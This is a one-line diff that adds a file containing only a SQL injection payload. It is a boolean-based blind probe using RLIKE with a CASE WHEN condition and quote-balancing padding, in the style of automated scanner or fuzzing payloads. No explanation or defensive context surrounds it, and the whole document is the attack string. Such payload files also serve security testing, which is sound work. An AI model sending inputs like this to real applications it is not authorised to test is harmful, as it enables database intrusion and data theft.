@@ -1,0 +1,1 @@
+1'))) rlike (select (case when (5524=9582) then 1 else 0x28 end)) and ((('okoj' like 'okoj
